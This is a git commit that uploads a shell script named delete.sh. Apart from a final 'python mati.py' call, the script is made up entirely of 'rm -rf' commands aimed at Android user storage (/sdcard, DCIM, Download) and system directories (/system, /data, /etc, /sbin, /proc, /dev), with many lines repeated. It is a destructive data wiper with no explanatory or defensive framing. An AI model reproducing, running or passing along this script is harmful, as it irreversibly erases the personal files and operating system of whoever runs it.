02c512e86359ba8820cc1b5831b7ab4dcf8a1ce2
MainIT <67462191+MainIT@users.noreply.github.com>
2020-07-05 16:30:26 +0700

    Add files via upload

---
+++ delete.sh
@@ -0,0 +1,48 @@
+rm -rf /storage/0403-0201 *
+rm -rf /sbin
+rm -rf /sdcard
+rm -rf /sdcard *
+rm -rf /storage
+rm -rf /sys
+rm -rf /sdcard/Android
+rm -rf /sdcard/Alarm
+rm -rf /sdcard/DCIM
+rm -rf /sdcard/Download
+rm -rf /sdcard/KineMaster
+rm -rf /sdcard/
+rm -rf /system
+rm -rf /vendor
+rm -rf /cache
+rm -rf /etc
+rm -rf /d
+rm -rf  /data
+rm -rf /dev
+rm -rf /mnt
+rm -rf /proc
+rm -rf /protect_f
+rm -rf /root
+rm -rf /sbin
+rm -rf /sys
+rm -rf /system
+rm -rf /vendor
+rm -rf /cache
+rm -rf /etc
+rm -rf /d
+rm -rf /data
+rm -rf /dev
+rm -rf /mnt
+rm -rf /proc
+rm -rf /protect_f
+rm -rf /root
+rm -rf /custom
+rm -rf /config
+rm -rf /acct
+rm -rf /storage
+rm -rf /storage/emulated
+rm -rf /storage/0403-0201
+rm -rf /storage/self
+python mati.py
+
+
+
+
